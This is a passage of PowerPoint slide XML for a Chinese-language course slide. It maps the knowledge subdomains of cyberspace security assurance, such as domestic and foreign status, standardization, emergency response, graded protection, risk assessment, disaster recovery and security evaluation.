          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525" algn="ctr">
            <a:noFill/>
            <a:miter lim="800000"/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B01302"/>
                </a:solidFill>
              </a:rPr>
              <a:t>知识域</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="AutoShape 7"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2485859" y="1280436"/>
            <a:ext cx="499531" cy="4001339"/>
          </a:xfrm>
          <a:prstGeom prst="leftBrace">
            <a:avLst>
              <a:gd name="adj1" fmla="val 72540"/>
              <a:gd name="adj2" fmla="val 50000"/>
            </a:avLst>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="38100">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:round/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="36000" rIns="36000" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Line 8"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4877044" y="1053968"/>
            <a:ext cx="57704" cy="4933288"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="connsiteX0" fmla="*/ 0 w 140891"/>
              <a:gd name="connsiteY0" fmla="*/ 0 h 3787055"/>
              <a:gd name="connsiteX1" fmla="*/ 140891 w 140891"/>
              <a:gd name="connsiteY1" fmla="*/ 3787055 h 3787055"/>
              <a:gd name="connsiteX0" fmla="*/ 0 w 97348"/>
              <a:gd name="connsiteY0" fmla="*/ 0 h 3801570"/>
              <a:gd name="connsiteX1" fmla="*/ 97348 w 97348"/>
              <a:gd name="connsiteY1" fmla="*/ 3801570 h 3801570"/>
              <a:gd name="connsiteX0" fmla="*/ 0 w 82834"/>
              <a:gd name="connsiteY0" fmla="*/ 0 h 3830598"/>
              <a:gd name="connsiteX1" fmla="*/ 82834 w 82834"/>
              <a:gd name="connsiteY1" fmla="*/ 3830598 h 3830598"/>
            </a:gdLst>
            <a:ahLst/>
            <a:cxnLst>
              <a:cxn ang="0">
                <a:pos x="connsiteX0" y="connsiteY0"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="connsiteX1" y="connsiteY1"/>
              </a:cxn>
            </a:cxnLst>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="82834" h="3830598">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:cubicBezTo>
                  <a:pt x="46964" y="1262352"/>
                  <a:pt x="35870" y="2568246"/>
                  <a:pt x="82834" y="3830598"/>
                </a:cubicBezTo>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="38100">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:prstDash val="dash"/>
            <a:round/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="AutoShape 9"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2981499" y="1028586"/>
            <a:ext cx="1710531" cy="495259"/>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网络空间安全</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>保障现状</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="AutoShape 11"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2915816" y="2504573"/>
            <a:ext cx="1816967" cy="573706"/>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我国信息安全保</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>障工作主要内容</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text Box 12"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5739984" y="5922147"/>
            <a:ext cx="2160984"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知识子域</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="3" name="Group 13"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="5334054" y="875773"/>
            <a:ext cx="2982362" cy="361207"/>
            <a:chOff x="535" y="663"/>
            <a:chExt cx="1142" cy="272"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="4" name="Group 14"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="535" y="663"/>
              <a:ext cx="1139" cy="272"/>
              <a:chOff x="2272" y="1479"/>
              <a:chExt cx="1363" cy="1800"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="91" name="AutoShape 15"/>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92" name="AutoShape 16"/>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93" name="AutoShape 17"/>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94" name="AutoShape 18"/>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90" name="Rectangle 19"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="586" y="663"/>
              <a:ext cx="1091" cy="255"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="9525">
              <a:noFill/>
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
            <a:effectLst/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr>
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="040404"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>国外网络空间安全保障现状</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="040404"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="5" name="Group 42"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="5314911" y="1667861"/>
            <a:ext cx="3001505" cy="401027"/>
            <a:chOff x="535" y="663"/>
            <a:chExt cx="1142" cy="272"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="6" name="Group 43"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="535" y="663"/>
              <a:ext cx="1139" cy="272"/>
              <a:chOff x="2272" y="1479"/>
              <a:chExt cx="1363" cy="1800"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="67"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68"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69"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70"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66"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网络空间安全标准化</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="040404"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="AutoShape 56"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4851173" y="994848"/>
            <a:ext cx="404904" cy="573622"/>
          </a:xfrm>
          <a:prstGeom prst="leftBrace">
            <a:avLst>
              <a:gd name="adj1" fmla="val 77423"/>
              <a:gd name="adj2" fmla="val 50000"/>
            </a:avLst>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="38100">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:round/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="AutoShape 57"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4851172" y="1825916"/>
            <a:ext cx="404905" cy="2146202"/>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sz="1600"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="15" name="Group 58"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="5323647" y="1280437"/>
            <a:ext cx="2992770" cy="357718"/>
            <a:chOff x="535" y="663"/>
            <a:chExt cx="1142" cy="272"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="16" name="Group 59"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="535" y="663"/>
              <a:ext cx="1139" cy="272"/>
              <a:chOff x="2272" y="1481"/>
              <a:chExt cx="1363" cy="1802"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="55" name="AutoShape 60"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="gray">
              <a:xfrm>
                <a:off x="2272" y="1481"/>
                <a:ext cx="1363" cy="1802"/>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56" name="AutoShape 61"/>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57" name="AutoShape 62"/>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58" name="AutoShape 63"/>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54" name="Rectangle 64"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="586" y="663"/>
              <a:ext cx="1091" cy="257"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="9525">
              <a:noFill/>
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
            <a:effectLst/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr>
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="040404"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>我国网络空间安全保障现状</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="040404"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Line 95"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2536556" y="1091620"/>
            <a:ext cx="27199" cy="4856362"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="38100">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:prstDash val="dash"/>
            <a:round/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="17" name="Group 42"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="5294515" y="2099909"/>
            <a:ext cx="3021901" cy="414665"/>
            <a:chOff x="535" y="663"/>
            <a:chExt cx="1142" cy="272"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="18" name="Group 43"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="535" y="663"/>
              <a:ext cx="1139" cy="272"/>
              <a:chOff x="2272" y="1479"/>
              <a:chExt cx="1363" cy="1800"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="6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61"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6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6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59" name="Rectangle 48"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="586" y="686"/>
              <a:ext cx="1091" cy="202"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="9525">
              <a:noFill/>
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
            <a:effectLst/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr>
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="040404"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>网络空间安全应急处理与信息通报</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="040404"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="52" name="AutoShape 11"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2987824" y="4808829"/>
            <a:ext cx="1710531"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网络空间安全保障</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>工作方法</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="19" name="Group 42"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="5352493" y="4268769"/>
            <a:ext cx="2963924" cy="357051"/>
            <a:chOff x="535" y="663"/>
            <a:chExt cx="1142" cy="272"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="20" name="Group 43"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="535" y="663"/>
              <a:ext cx="1139" cy="272"/>
              <a:chOff x="2272" y="1479"/>
              <a:chExt cx="1363" cy="1800"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="71"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72"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73"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74"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65" name="Rectangle 48"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="586" y="663"/>
              <a:ext cx="1091" cy="258"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="9525">
              <a:noFill/>
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
            <a:effectLst/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr>
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="040404"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>确定网络空间安全需求</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="040404"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="75" name="AutoShape 57"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4888753" y="4412785"/>
            <a:ext cx="450453" cy="1429917"/>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sz="1600"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="23" name="Group 42"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="5366523" y="5168869"/>
            <a:ext cx="2949893" cy="393056"/>
            <a:chOff x="535" y="663"/>
            <a:chExt cx="1142" cy="272"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="24" name="Group 43"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="535" y="663"/>
              <a:ext cx="1139" cy="272"/>
              <a:chOff x="2272" y="1479"/>
              <a:chExt cx="1363" cy="1800"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="79"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80"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81"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82"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78" name="Rectangle 48"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="586" y="663"/>
              <a:ext cx="1091" cy="234"/>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网络空间安全测评</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="040404"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="25" name="Group 42"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="5328085" y="2564904"/>
            <a:ext cx="2980394" cy="395746"/>
            <a:chOff x="535" y="663"/>
            <a:chExt cx="1142" cy="272"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="26" name="Group 43"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="535" y="663"/>
              <a:ext cx="1139" cy="272"/>
              <a:chOff x="2272" y="1479"/>
              <a:chExt cx="1363" cy="1800"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="89"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95"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96"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97"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83" name="Rectangle 48"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="586" y="663"/>
              <a:ext cx="1091" cy="233"/>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网络空间安全等级保护</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="040404"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="27" name="Group 42"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="5330519" y="2996952"/>
            <a:ext cx="2970131" cy="364164"/>
            <a:chOff x="535" y="663"/>
            <a:chExt cx="1142" cy="272"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="29" name="Group 43"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="535" y="663"/>
              <a:ext cx="1139" cy="272"/>
              <a:chOff x="2272" y="1479"/>
              <a:chExt cx="1363" cy="1800"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="101"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02"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03"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04"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00" name="Rectangle 48"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="586" y="663"/>
              <a:ext cx="1091" cy="253"/>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网络空间安全风险评估</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="040404"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="30" name="Group 42"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="5330519" y="3401953"/>
            <a:ext cx="2977959" cy="354140"/>
            <a:chOff x="535" y="663"/>
            <a:chExt cx="1142" cy="272"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="31" name="Group 43"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="535" y="663"/>
              <a:ext cx="1139" cy="272"/>
              <a:chOff x="2272" y="1479"/>
              <a:chExt cx="1363" cy="1800"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="108"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09"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10"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11"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07" name="Rectangle 48"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="586" y="663"/>
              <a:ext cx="1091" cy="211"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="9525">
              <a:noFill/>
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
            <a:effectLst/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr>
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="040404"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>灾难恢复</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="040404"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="32" name="Group 42"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="5328085" y="3800717"/>
            <a:ext cx="2988332" cy="360040"/>
            <a:chOff x="535" y="663"/>
            <a:chExt cx="1142" cy="272"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="33" name="Group 43"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="535" y="663"/>
              <a:ext cx="1139" cy="272"/>
              <a:chOff x="2272" y="1479"/>
              <a:chExt cx="1363" cy="1800"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="115"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16"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17"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18"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14" name="Rectangle 48"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
